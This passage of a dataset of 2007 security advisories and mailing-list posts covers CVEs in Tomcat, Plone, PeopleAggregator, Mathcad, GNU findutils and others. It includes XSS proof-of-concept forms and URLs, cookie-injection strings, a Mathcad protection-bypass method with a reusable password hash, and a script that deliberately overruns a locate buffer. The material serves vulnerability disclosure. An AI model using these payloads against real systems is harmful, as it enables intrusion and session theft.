Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFHPEeNIR7qMdg1EfYRAmKMAKCDcXmqRSNbCHZFS4GzGo7oVUl08gCfS/sY
d6F8+jrnT59SZgCXfftImEA=
=oC2/
-----END PGP SIGNATURE-----"
23383,CVE-2007-3694: Cross site scripting (XSS) in broadcast machine,,CVE-2007-3694,"Source:
http://int21.de/cve/CVE-2007-3694-bm.html
Cross site scripting (XSS) in broadcast machine
References
http://www.getmiro.com/create/broadcast/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3694
Description
Cross site scripting describes attacks that allow to insert malicious html or
javascript code via get or post forms. This can be used to steal session
cookies.
Broadcast machine is a web-based video platform tool. It's login form is
vulnerable to XSS.
Sample code
<form action=""http://somesite.com/login.php"" method=""post"">
<input type=""text"" name=""username"" value='""<script>alert(1)</script>'>
<input type=""submit""></form>
Workaround/Fix
Vendor consideres broadcast machine dead software and won't provide any
updates. However it's still used on some live sites in the internet.
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2007-3694 to this issue. This is a candidate for inclusion in the CVE
list (http://cve.mitre.org/), which standardizes names for security problems.
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org
webhosting. It's licensed under the creative commons attribution license.
Hanno Boeck, 2007-11-12, http://www.hboeck.de"
23385,PeopleAggregatory security advisory - re CVE-2007-5631,,CVE-2007-5631,"Hi all,
This is a notification that the remote file inclusion vulnerabilities reported
in CVE-2007-5631 have been fixed in PeopleAggregator v1.2pre6-release-55, and
are not exploitable if PHP's register_globals directive is disabled.
CVE entry: http://nvd.nist.gov/nvd.cfm?cvename=CVE-2007-5631
-----
Multiple PHP remote file inclusion vulnerabilities in PeopleAggregator 1.2pre6
allow remote attackers to execute arbitrary PHP code via a URL in the
current_blockmodule_path parameter to (1)
AudiosMediaGalleryModule/AudiosMediaGalleryModule.php, (2)
ImagesMediaGalleryModule/ImagesMediaGalleryModule.php, (3)
MembersFacewallModule/MembersFacewallModule.php, (4)
NewestGroupsModule/NewestGroupsModule.php, (5)
UploadMediaModule/UploadMediaModule.php, and (6)
VideosMediaGalleryModule/VideosMediaGalleryModule.php in BetaBlockModules/; and
(7) the path_prefix parameter to several components.
-----

Notes from vendor: To be exploitable, the web server must be configured with
PHP's register_globals directive ON. To fix a vulnerable installation, either
turn register_globals OFF in php.ini or via the php_flag Apache option, or
upgrade to v1.2pre6-release-55.
Advisory blog post: http://www.myelin.co.nz/post/2007/11/12/#200711121
Upgrade instructions:
- If installed via Subversion, 'svn update' in the root of your PeopleAggregator
install.
- If installed via tarball, download the latest tarball from
http://update.peopleaggregator.org/dist/peopleaggregator-1.2pre6-release-
55.tar.gz and copy all files over those from your existing installation.
Regards,
Phillip Pearson
Broadband Mechanics"
23444,[CVE-2007-5741] Plone: statusmessages and linkintegrity unsafe network data hotfix,,CVE-2007-5741,"A vulnerability in both the statusmessages and linkintegrity modules has been identified, where untrusted network data was treated as a pickle and loaded. This allows an attacker to run arbitrary python code within the Zope/Plone process.
This issue has been assigned CVE-2007-5741
Affected versions
-----------------
This hotfix applies to Plone 2.5 up to and including 2.5.4, and Plone 3.0 up
to and including 3.0.2.
These fixes will be included in the upcoming 2.5.5 and 3.0.3 releases, at
which point this hotfix can be removed.
Earlier plone releases (versions 2.1.x and below) are not affected.
Plone Hotfix 2007-11-06
-----------------------
A hotfix that addresses this vulnerability can be downloaded at:
http://plone.org/products/plone-hotfix/releases/20071106
The hotfix should be installed as soon as possible. To install, simply extract the archive into your Zope/Plone products directory and restart the server.
Martijn Pieters
The Plone Security Response Team"
23468,DoS Exploit for DHCPd bug (Bugtraq ID 25984 ; CVE-2007-5365),,CVE-2007-5365,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Hello,
I've been playing with DHCPd bug in *Ubuntu Linux*. According to the
analysis by Core it could be theoretically possible to get a shell (""the
possibility of using it to execute arbitrary code on vulnerable systems was
not investigated in-depth and should not be disregarded""):
http://www.coresecurity.com/index.php5?module=ContentMod&action=item&id=1962
But in practice it doesn't seems to be possible because vulnerable memcpy
tries to write past the end of the stack region (it tries to write ~64
kbytes, when available stack space is ~8 kbytes), so you always get an
instant ""Segmentation fault"", without any chance to control EIP.
DoS exploit is quite trivial. DHCPd crashes using mms values:
278 <= mms <= 284
I've attached working (DoS) exploit.
If some code-ninja has any idea about how to overcome the former
exploitation problem, please, I'd be interested in knowing it (perhaps
performing a previous DHCP operation in order for the stack to be expanded,
before launching the real exploit?).
- --
Saludos,
- -Roman
PGP Fingerprint:
09BB EFCD 21ED 4E79 25FB 29E1 E47F 8A7D EAD5 6742
[Key ID: 0xEAD56742. Available at KeyServ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
iD8DBQFHK5E/5H+KferVZ0IRAuf1AKD2B2UIccm8xNOM/WIkhNUiad4VigCePom0
KdZvmNSuBNnefofp7g/RY+M=
=bLqK
-----END PGP SIGNATURE-----"
23679,"Re: Third-party patch for CVE-2007-3896, UPDATE NOW",,CVE-2007-3896,"KJK::Hyperion ha scritto:
> The present patch is dramatically under-tested and it has underwent no
> quality assurance procedure whatsoever, so please deploy with the
> greatest care.
Indeed, I just found a gruesome memory leak in it. A silly bug, brown
paperbag-grade shame. If you installed my patch, upgrade RIGHT THIS
MOMENT NOW or slowly die:
<http://spacebunny.xepher.net/hack/shellexecutefiasco/>
For the press guys watching: THIS IS VERY IMPORTANT, more important than
the original patch was. I don't expect ""shitty patch actually shitty"" to
seriously make the big headlines, but, hey, a heads up: there is a good
reason Microsoft takes a lot of time to put patches out, after all. I
don't do this for the reputation, either: I already made a U-turn on my
feelings about the vulnerability, I'm not too proud to admit my mistakes
(god knows how big the egos can get in FD)"
23699,CVE-2007-4600 - Mathcad Protect Worksheet Vulnerability,,CVE-2007-4600,"Mathcad Security Vulnerability Briefing - CVE-2007-4600
Synopsis of Vulnerability
==========================
The �Protect Worksheet� functionality, used to protect sections Mathcad sheets from alterations, in versions 12 through 14 is easily bypassed allowing access to the protected data due to the implementation of the file format used to save the files.
Background on Mathcad
======================
Mathcad (http://www.ptc.com/appserver/mkt/products/home.jsp?k=3901) is used to perform, document and share calculation and design work. The unique Mathcad visual format and scratchpad interface integrate standard mathematical notation, text and graphs in a single worksheet - making Mathcad ideal for knowledge capture, calculation reuse, and engineering collaboration.
Vulnerable Software Versions
=============================
Mathsoft, Mathcad 12
Mathsoft, Mathcad 13
Mathsoft, Mathcad 13.1
PTC, Mathcad 14
Running on Microsoft, Windows 2000, Service Pack 4
Running on Microsoft, Windows XP, Service Pack 2
Impact
=======
Access Vector: Locally exploitable.
Access Complexity: Low.
Authentication: Not required to exploit.
Impact type: Provides unauthorised access. Allows partial confidentiality, integrity, and availability violation. Allows unauthorised disclosure of information.
Description of Vulnerability
=============================
According to Mathcad�s online help:
�When distributing worksheets, you may wish to restrict user access to most regions. Rather than locking an area, you may opt instead to use worksheet protection.
The intent of file protection is to prevent other users from opening the worksheet in a text editor and editing its contents by hand. The allowed file formats are either binary (XMCDZ, MCD) or output-only (RTF, HTML). With file protection enabled, you can only alter the contents of a worksheet from Mathcad. You can create, edit, and delete regions within the worksheet with no restrictions.�
The XMCDZ file format is not a true binary format. It is the standard Mathcad .XMCD XML sheet, which has been GZIPPED. For this reason it is a simple matter to get the original plain text XML sheet out of the file, using an archive utility.
Once the XML file has been extracted, within the <editor> tag there will be a <protection> tag. This will look like:
<protection protection-level=""low"" password=""XZEdIlJPXZxa1CQRKn6Sfw==""/>
There are 2 components to this tag; the level of restrictions places upon the sheet and also an optional password needed for un-protecting the sheet.
There are 3 protection-level settings, high, medium and low. These correspond to Editing, Content and File protection, respectively. For example if a sheet was saved with Editing protection enabled, then the <protection> tag would have a ""high"" protection level. This can easily be changed with a text editor before the sheet is reopened in Mathcad.
The password is hashed, however the same hash is always produced for a given string. For example ""XZEdIlJPXZxa1CQRKn6Sfw=="" represents the string ""password"", and could be used in any sheet.
Due to these limitations the entire <protection> tag could be removed, the level of protection could be reduced, or the password could be changed.
The MCD format is a proprietary binary type format. It was used in older version of the application, before the XML format became the standard. However if this format is selected from a newer version of the application, a warning is generated stating that �If your worksheet is saved as a Mathcad 11 file, some features and calculations may not be preserved�. Selecting either Mathcad 11 or Mathcad 12 MCD file formats produces a warning about potential loss of functionality.
The sheets do include an MD5 hash, however this is only used internally by the application to determine if the sheet has been changed outside of Mathcad and the equations require recalculating. Changing the <protection> tag in the XML file will not be detected by the application, and no exceptions will be raised.
Workaround
===========
None.
Proof of Concept
=================
None required."
23719,Third-party patch for CVE-2007-3896 (Internet Explorer 7 invalid URI handling) available,,CVE-2007-3896,"KJK::Hyperion ha scritto:
> Since this issue is a great big rats nest, I promise a third-party patch
> for it by tomorrow. Deal?
And ""tomorrow"" turned out to be ""whenever it's done"". Here is it, have a
temporary, third-party patch for CVE-2007-3896, by yours truly:
<http://spacebunny.xepher.net/hack/shellexecutefiasco/>
----
ShellExecuteFiasco - third-party patch for CVE-2007-3896
Copyright (C) 2007 KJK::Hyperion <hackbunny s0ftpj org>
<http://spacebunny.xepher.net/>
ABOUT
-----
This is an unofficial, third-party patch for vulnerability CVE-2007-3896
[1], intended to protect supported Microsoft operating systems until an
official patch is released, and unsupported systems as well. You only
need this patch if you have Internet Explorer 7 on any operating system
older than Windows Vista, and only until Microsoft releases an official
fix.
The present patch is dramatically under-tested and it has underwent no
quality assurance procedure whatsoever, so please deploy with the
greatest care. It has a very good chance of misbehaving and making your
system unusable; should this happen, rebooting in safe mode with command
prompt might make it possible to uninstall it, or it might as well not.
The patch consists of a ShellExecuteEx hook [2] that prevents the
execution of malformed URLs and enforces normalization of valid URLs.
Programs registering custom URL schemes might not like, support or even
know about normalized URLs: this patch will interfere with any such
program to the point of unusability. The normalization proper is
performed by Internet Explorer's low-level internet engine, which could
mangle unknown URL schemes or otherwise act unpredictably when presented
with abnormal input.
Notes
[1] <URL:http://www.microsoft.com/technet/security/advisory/943521.mspx>
[2] <URL:http://msdn2.microsoft.com/en-us/library/bb775101.aspx>
INSTALLATION
------------
1. Copy shellexecutefiasco.dll anywhere; %windir%system32 will do.
2. Run the command:
A. ""regsvr32 <full path to shellexecutefiasco.dll>"" or ""regsvr32 /n
/i:s <full path to shellexecutefiasco.dll>"" to install for all
users
B. ""regsvr32 /n /i:u <full path to shellexecutefiasco.dll>"" to
install for the current user only.
3. A message box will report whether the installation was successful.
You need to be a privileged user to install this patch.
UNINSTALLATION
--------------
1. Run the command ""regsvr32 /u <full path to shellexecutefiasco.dll>"".
2. A message box will report whether the uninstallation was successful.
3. Delete shellexecutefiasco.dll.
You need to be a privileged user to fully uninstall this patch.
LICENSE
-------
The patch is released as open source under the following license:
Copyright (c) 2007 KJK::Hyperion
Permission is hereby granted, free of charge, to any person obtaining a
copy of this software and associated documentation files (the
""Software""), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:
The above copyright notice and this permission notice shall be included
in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
--
KJK:: HYPE
RION"
24091,Oracle Jinitiator 1.1.8 Vulnerabilities CVE-2007-4467 - Additional Information,,CVE-2007-4467,"US-CERT released an advisory on August 28, 2007 regarding multiple stack
buffer overflows in the Oracle Jinitiator product (Vulnerability Note
VU#474433/CVE-2007-4467).  Due to limited public technical information on
Jinitiator, no access to the Oracle support website, and maybe lack of
cooperation from Oracle itself, the information released by US-CERT is
incomplete as to the true scope of vulnerable Jinitiator versions, does not
identify all vulnerable Jinitiator installs, and has only limited
remediation steps.
All released Jinitiator 1.1.8 versions from 1.1.8.3 to 1.1.8.25 contain the
buffer overflows in the Jinitiator ActiveX control – the US-CERT advisory
only identifies versions through 1.1.8.16 as vulnerable.  Each Jinitiator
1.1.8 version install uses a separate Microsoft Windows CLSID for the
vulnerable ActiveX control to allow for multiple versions to co-exist,
therefore, 15 CLSIDs must be used to disable/identify the vulnerable ActiveX
controls rather than the single CLSID identified in the original advisory. 
In addition to disabling and uninstalling the vulnerable Jinitiator
software, applications currently using vulnerable Jinitiator versions must
be upgraded to use version 1.3.x which may also require upgrading the Oracle
Forms software running on the server.  It is important to note that each
Jinitiator version (1.1.8.x) is a separate installation and there could be
theoretically as many as 15 versions of Jinitiator 1.1.8 simultaneously
installed on a client PC, even though only one or two versions are currently
being used.
Oracle Jinitiator is used by many Oracle Forms applications including
mission-critical applications like Oracle E-Business Suite 11i, Oracle
Clinical (RDC), Retek/Oracle Retail, Sungard Banner, and i-flex FLEXCUBE. 
Any client PC that has accessed an Oracle Forms application may have one or
more vulnerable Jinitiator versions installed, since obsolete versions are
never overwritten or uninstalled.
Integrigy has released a detailed analysis of these vulnerabilities to
provide additional information and comprehensive remediation steps.  The
analysis can be downloaded from -
http://www.integrigy.com/security-resources/analysis/integrigy-oracle-jiniti
ator-vulnerability.pdf"
24416,Re: CVE-2007-3382: Handling of cookies containing a ' character,,CVE-2007-3382,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Mark,
Mark Thomas wrote:
> CVE-2007-3382: Handling of cookies containing a ' character
>
> Versions Affected:
> 5.5.0 to 5.5.24
Since 5.5.24 isn't yet released, will an upcoming 5.5.24 release include
a fix for this problem given:
> Mitigation:
> Upgrade to 6.0.14
?
Thanks,
- -chris
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGwc+29CaO5/Lv0PARAug2AJ98oeF8HRLiXIqqzDEazknml6N/pwCgiNkO
+SIMwuOKQWDG0lkT1okzO7I=
=6jSG
-----END PGP SIGNATURE-----"
24424,CVE-2007-3386: XSS in Host Manager,,CVE-2007-3386,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2007-3386: XSS in Host Manager
Severity:
Low (Cross-site scripting)
Vendor:
The Apache Software Foundation
Versions Affected:
6.0.0 to 6.0.13
5.5.0 to 5.5.24
Description:
The Host Manager Servlet does not filter user supplied data before
display. This enables an XSS attack.
Mitigation:
Log out (close browser) of the Host Manager application once admin
tasks are complete
Upgrade to 6.0.14
Credit:
This issue was discovered by the NTT OSS CENTER who worked with the
JPCERT/CC to report the vulnerability.
Example:
<form action=""http://localhost:8080/host-manager/html/add"" method=""get"">
<input type=""hidden"" NAME='name' VALUE=""aaa"">
<input type=""hidden"" NAME='aliases' VALUE=""<script>alert()</script>"">
<input type=""submit"">
</form>
References:
http://tomcat.apache.org/security.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGwSFyb7IeiTPGAkMRAlgMAKCe0hS+c6so9pxK3KfN7LggWv+3uQCfUsAg
95+vMfHDJlrKHP/yKUZ0SYc=
=1pQc
-----END PGP SIGNATURE-----"
24425,"CVE-2007-3385: Handling of "" in cookies",,CVE-2007-3385,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2007-3385: Handling of "" in cookies
Severity:
Low (Session Hi-jacking)
Vendor:
The Apache Software Foundation
Versions Affected:
6.0.0 to 6.0.13
5.5.0 to 5.5.24
5.0.0 to 5.0.30
4.1.0 to 4.1.36
3.3 to 3.3.2
Description:
Tomcat incorrectly handles the character sequence "" in a cookie
value. In some circumstances this can lead to the leaking of
information such as session ID to an attacker.
Mitigation:
Upgrade to 6.0.14
Credit:
This issue was discovered by Tomasz Kuczynski, Poznan Supercomputing
and Networking Center, who worked with the CERT/CC to report the
vulnerability.
Example:
http://localhost:8080/examples/servlets/servlet/CookieExample?cookiename=HAHA&cookievalue=%5C%22FOO%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%3B+Path%3D%2F%3B
References:
http://tomcat.apache.org/security.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGwSFlb7IeiTPGAkMRArdPAJ99AXYzSterU7oG+u8UrtQAd2lTZwCbBK2R
hwRixKaYOwWyj5kD+fLT1ls=
=hgTP
-----END PGP SIGNATURE-----"
24426,CVE-2007-3382: Handling of cookies containing a ' character,,CVE-2007-3382,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2007-3382: Handling of cookies containing a ' character
Severity:
Low (Session Hi-jacking)
Vendor:
The Apache Software Foundation
Versions Affected:
6.0.0 to 6.0.13
5.5.0 to 5.5.24
5.0.0 to 5.0.30
4.1.0 to 4.1.36
3.3 to 3.3.2
Description:
Tomcat incorrectly treats a single quote character (') in a cookie
value as a delimiter. In some circumstances this can lead to the
leaking of information such as session ID to an attacker.
Mitigation:
Upgrade to 6.0.14
Credit:
This issue was discovered by Tomasz Kuczynski, Poznan Supercomputing
and Networking Center, who worked with the CERT/CC to report the
vulnerability.
Example:
http://localost:8080/servlets-examples/servlet/CookieExample?cookiename=BLOCKER&cookievalue=%5C%22A%3D%27%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%3B+Path%3D%2Fservlets-examples%2Fservlet+%3B
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGwSFVb7IeiTPGAkMRAjkwAKDnu+C08WRZazmZfzunFeHcitsvnACg3CtP
6c6FCxbFOcfxhqqayg8kdUI=
=MkDj
-----END PGP SIGNATURE-----"
24576,CVE-2007-3384: XSS in Tomcat cookies example,,CVE-2007-3384,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2007-3384: XSS in Tomcat cookies example
Severity:
Low (Cross-site scripting)
Vendor:
The Apache Software Foundation
Versions Affected:
3.3 to 3.3.2
Description:
When reporting error messages, Tomcat does not filter user supplied
data before display. This enables an XSS attack.
Mitigation:
Remove examples web application.
Apply patch available from http://tomcat.apache.org/download-33.cgi
Credit:
This issue was discovered by Tomasz Kuczynski, Poznan Supercomputing
and Networking Center, who worked with the CERT/CC to report the
vulnerability.
Example:
http://localhost:8080/examples/servlet/CookieExample
populate Name or Value field with:
<script>alert('XSS reflected');</script>
and submit.
References:
http://tomcat.apache.org/security.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGsU0Vb7IeiTPGAkMRAoiwAJ4iETiZnDPLKM0v69YZ/FaIhGS8GwCgt+ux
FB0O3FigwHs+A8pP98+gRiA=
=VePF
-----END PGP SIGNATURE-----"
24718,CVE-2007-3383: XSS in Tomcat send mail example,,CVE-2007-3383,"CVE-2007-3383: XSS in Tomcat send mail example
Severity:
Low (Cross-site scripting)
Vendor:
The Apache Software Foundation
Versions Affected:
4.0.0 to 4.0.6
4.1.0 to 4.1.36
Description:
When reporting error messages, the SendMailServlet does not filter
user supplied data before display. This enables an XSS attack.
Mitigation:
Undeploy the examples web application.
Credit:
This issue was discovered by Tomasz Kuczynski, Poznan Supercomputing
and Networking Center, who worked with the CERT/CC to report the
vulnerability.
Example:
On this page
http://localhost:8080/examples/jsp/mail/sendmail.jsp
enter the following text
<script>alert('XSS reflected')</script>
in the From field and click Send.
References:
http://tomcat.apache.org/security.html
Mark Thomas"
24719,Re: [WEB SECURITY] [CVE-2007-3816][Advisory] JWIG Context-Dependent Template Calling Dos,,CVE-2007-3816,"Hi,
Too bad you have fell for this without verifying things first i'll just break
two of the claims given by secniche.
First of all lets all get this straight, JWIG is for web services creation. For
the attacks to succeed the attacker will have to manipulate the things at the
server end.
Reading http://www.secniche.org/papers/HackAnnotationsInJWIG.pdf
1. Claim: Code gapping.
The example given will have to be written at the server end, very similar to writing
a PHP program. So tell me if you write rogue code yourself and load it is it JWIG to
blame ?. The attacker cannot load this rogue code. For example the code at the
following link
http://www.brics.dk/JWIG/demo/TempMan.jwig
Once this is compliled and installed, can't see how an attacker will manipulate this.
2. Claim: XML Fragmenting
This is where it gets really strange, the example given again has to written as a source
code, compiled and then installed. If i write a code that refers to a XML document
it is me responsible for ensuring that the things are right not JWIG, also this
is simply called External XML templates and it has nothing to do with fragmenting.
http://www.brics.dk/JWIG/manual/documents.html
So finally to put things together, Can't see where is the vulnerability.
If you write rogue code yourself you cannot blame JWIG, PHP etc.
The rest of the article is also filled with same bogus claims.
I would request everyone to take a very close look at secniche claims.
Also please continue using JWIG it is a sweet technology, especially features
like an explicit language-based notion of sessions, which avoids cookies and URL
rewriting, makes it a more better platform for writing secure web applications.
regards
warl0ck // MSG"
24724,[CVE-2007-3816][Advisory] JWIG Context-Dependent Template Calling Dos,,CVE-2007-3816,"Advisory : JWIG Context-Dependent Template Calling Dos
CVE- 2007-3816
Dated : 12 July 2007
Vulnerable Software : BRICS, JWIG
Severity : Intermediate
Explanation:
JWIG might allow context-dependent attackers to cause a denial of service (service degradation) via loops of
references to external templates. For more details :
http://www.secniche.org/papers/HackAnnotationsInJWIG.pdf
Links:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3816
http://nvd.nist.gov/cpe.cfm?cvename=CVE-2007-3816
Regards
Aditya K Sood
SecNiche Security"
25057,[CVE-2007-1358] Apache Tomcat XSS vulnerability in Accept-Language header processing,,CVE-2007-1358,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2007-1358: Apache Tomcat XSS vulnerability in Accept-Language
header processing
Severity:
Low (cross-site scripting)
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.0.0 to 4.0.6
Tomcat 4.1.0 to 4.1.34
Tomcat 5.0.0 to 5.0.30
Tomcat 5.5.0 to 5.5.20
Tomcat 6.0.0 to 6.0.5
Description:
Web pages that display the Accept-Language header value sent by the
client are susceptible to a cross-site scripting attack if they assume
the Accept-Language header value conforms to RFC 2616. Under normal
circumstances this would not be possible to exploit, however older
versions of Flash player were known to allow carefully crafted
malicious Flash files to make requests with such custom headers.
Tomcat now ignores invalid values for Accept-Language headers that do
not conform to RFC 2616.
Mitigation:
1. Upgrade to fixed version
2. Escape values obtained from Accept-Language header before use.
Credit:
This issue was reported by Masato Anzai and Toshiharu Sugiyama.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGdxWMb7IeiTPGAkMRAgDgAJkBG6sVBDP/8yxGrZ7CqvEXPNW1mACgiL8M
CyWgpvE5125qciTSYPJbOgU=
=A84r
-----END PGP SIGNATURE-----"
25097,[CVE-2007-2450]: Apache Tomcat XSS vulnerability in Manager,,CVE-2007-2450,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2007-2450: Apache Tomcat XSS vulnerabilities in Manager
Severity: low (cross-site scripting)
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.0.0 to 4.0.6
Tomcat 4.1.0 to 4.1.36
Tomcat 5.0.0 to 5.0.30
Tomcat 5.5.0 to 5.5.24
Tomcat 6.0.0 to 6.0.13
Description:
The Manager and Host Manager web applications do not escape some user
provided data before including it in the output. This enables a XSS
attack. The user must be logged in to the Manager or Host Manager web
application.
Mitigation:
1. Log out of the Manager or Host Manager application (close the
browser) once tasks requiring use of the manager have been completed.
Example:
<form action=""http://example.com:8080/manager/html/upload""
method=""post"" enctype=""multipart/form-data"">
<INPUT TYPE=""hidden""
NAME='deployWar"";filename=""<script>alert()</script>""
Content-Type: image/gif' VALUE=""abc"">
<input type=""submit"">
</form>
Credit:
These issues were discovered by Daiki Fukumori, Secure Sky Technology.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGcKdkb7IeiTPGAkMRAt1IAKCR47H3juKSvEdGwymOMCpKZdXi8wCgvrzl
aQy4/FihDqtrwRDLl0f/asA=
=RGcQ
-----END PGP SIGNATURE-----"
25098,[CVE-2007-2449] Apache Tomcat XSS vulnerabilities in the JSP examples,,CVE-2007-2449,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2007-2449: Apache Tomcat XSS vulnerabilities in the JSP examples
Severity: low (cross-site scripting)
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.0.0 to 4.0.6
Tomcat 4.1.0 to 4.1.36
Tomcat 5.0.0 to 5.0.30
Tomcat 5.5.0 to 5.5.24
Tomcat 6.0.0 to 6.0.13
Description:
The JSP examples web application displays does not escape some user
provided data before including it in the output. This enables a XSS
attack.
Mitigation:
1. Undeploy the examples web application(s).
Example:
http://host:port/jsp-examples/snp/snoop.jsp;<script>alert()</script>test.jsp
Credit:
These issues were discovered by an unknown security researcher and
reported to JPCERT.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFGcKbJb7IeiTPGAkMRAi9BAKDsuoomGh2n9BYl7mT/tGEjQ+HIlQCdHjnU
zdreMwViLR/bDBnys5YkhPk=
=SK7+
-----END PGP SIGNATURE-----"
25258,GNU Findutils release 4.2.31 fixes CVE-2007-2452 (GNU locate heap buffer overrun),,CVE-2007-2452,"$Revision: 1.4 $; $Date: 2007/05/30 22:04:52 $
I. BACKGROUND
=============
GNU findutils is a set of programs which search for files on Unix-like
systems. It is maintained by the GNU Project of the Free Software
Foundation. For more information, see http://www.gnu.org/software/findutils.
II. DESCRIPTION
===============
When GNU locate reads filenames from an old-format locate database,
they are read into a fixed-length buffer allocated on the heap.
Filenames longer than the 1026-byte buffer can cause a buffer overrun.
The overrunning data can be chosen by any person able to control the
names of filenames created on the local system. This will normally
include all local users, but in many cases also remote users (for
example in the case of FTP servers allowing uploads).
III. ANALYSIS
=============
Findutils supports three different formats of locate database, its
native format ""LOCATE02"", the slocate variant of LOCATE02, and a
traditional (""old"") format that locate uses on other Unix systems.
When locate reads filenames from a LOCATE02 database (the default
format), the buffer into which data is read is automatically extended
to accommodate the length of the filenames.
This automatic buffer extension does not happen for old-format
databases. Instead a 1026-byte buffer is used. When a longer
pathname appears in the locate database, the end of this buffer is
overrun. The buffer is allocated on the heap (not the stack).
If the locate database is in the default LOCATE02 format, the locate
program does perform automatic buffer extension, and the program is
not vulnerable to this problem. The software used to build the
old-format locate database is not itself vulnerable to the same
attack.
Most installations of GNU findutils do not use the old database
format, and so will not be vulnerable.
IV. DETECTION
=============
Software:
All existing releases of findutils are affected.
Installations:
To discover the longest path name on a given system, you can use the
following command (requires GNU findutils and GNU coreutils):
find / -print0 | tr -c '' 'x' | tr '' ' ' | wc -L
V. EXAMPLE
==========
This section includes a shell script which determines which of a list
of locate binaries is vulnerable to the problem. The shell script has
been tested only on glibc based systems having a mktemp binary.
NOTE: This script deliberately overruns the buffer in order to
determine if a binary is affected. Therefore running it on your
system may have undesirable effects. We recommend that you read the
script before running it.
#! /bin/sh
set +m
if vanilla_db=""$(mktemp nicedb.XXXXXX)"" ; then
if updatedb --prunepaths="""" --old-format --localpaths=""/tmp""
--output=""${vanilla_db}"" ; then
true
else
rm -f ""${vanilla_db}""
vanilla_db=""""
echo ""Failed to create old-format locate database; skipping the
sanity checks"" >&2
fi
fi
make_overrun_db() {
# Start with a valid database
cat ""${vanilla_db}""
# Make the final entry really long
dd if=/dev/zero bs=1 count=1500 2>/dev/null | tr '00' 'x'
}
ulimit -c 0
usage() { echo ""usage: $0 binary [binary...]"" >&2; exit $1; }
[ $# -eq 0 ] && usage 1
bad=""""
good=""""
ugly=""""
if dbfile=""$(mktemp nasty.XXXXXX)""
then
make_overrun_db > ""$dbfile""
for locate ; do
ver=""$locate = $(""$locate"" --version | head -1)""
if [ -z ""$vanilla_db"" ] || ""$locate"" -d ""$vanilla_db"" """" >/dev/null ; then
""$locate"" -d ""$dbfile"" """" >/dev/null
if [ $? -gt 128 ] ; then
bad=""$bad
vulnerable: $ver""
else
good=""$good
good: $ver""
fi
else
# the regular locate failed
ugly=""$ugly
buggy, may or may not be vulnerable: $ver""
fi
done
rm -f ""${dbfile}"" ""${vanilla_db}""
# good: unaffected. bad: affected (vulnerable).
# ugly: doesn't even work for a normal old-format database.
echo ""$good""
echo ""$bad""
echo ""$ugly""
else
exit 1
fi
VI. VENDOR RESPONSE
===================
The GNU project discovered the problem while 'locate' was being worked
on. The GNU findutils maintainer has issued a patch as part of this
announcement. The patch appears below, but the relevant change is
also included in findutils version 4.2.31, which is available by FTP
at ftp://ftp.gnu.org/gnu/findutils/findutils-4.2.31.tar.gz.
A release of findutils-4.3.x will follow and will also include the
patch.
VII. PATCH
==========
A version of findutils in which this problem has been addressed is
